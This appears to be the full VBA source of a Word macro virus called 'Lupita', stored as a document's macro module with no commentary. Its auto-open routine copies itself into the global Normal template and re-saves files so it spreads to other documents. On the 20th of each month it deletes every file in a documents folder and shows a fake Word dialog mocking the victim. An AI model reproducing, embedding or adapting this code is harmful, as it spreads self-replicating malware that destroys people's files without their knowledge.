   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoopeN"

   Public Sub MAIN()
   Dim a$
   Dim b$
   Dim diálogoEjem As Object
   Dim botón
        'VIRUS LUPITA
        'MADE IN PERU
        On Error Resume Next
        a$ = WordBasic.[FileName$]() + ":AutoopeN"
        b$ = "Global:AUTOOPEN"
        WordBasic.MacroCopy a$, b$
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy b$, a$
        If WordBasic.Day(WordBasic.Now()) = 20 Then
           WordBasic.Kill "C:\MIS DOCUMENTIS\*.*"
   '*******LA CAJITA DE MENSAJE ****************
        WordBasic.BeginDialog 320, 144, "Microsoft Word"
       WordBasic.PushButton 110, 93, 97, 21, "OK", "Presionar1"
       WordBasic.Text 75, 32, 237, 33, "Los archivos de tu maquina ", "Texto1"
       WordBasic.Text 75, 49, 237, 33, "han sido borrados.....jejejeje", "Texto2"
       WordBasic.EndDialog
   '********************************************
       Set diálogoEjem = WordBasic.CurValues.UserDialog
       WordBasic.DisableInput 1
       botón = WordBasic.Dialog.UserDialog(diálogoEjem)
       WordBasic.DisableInput 0
        End If

   End Sub
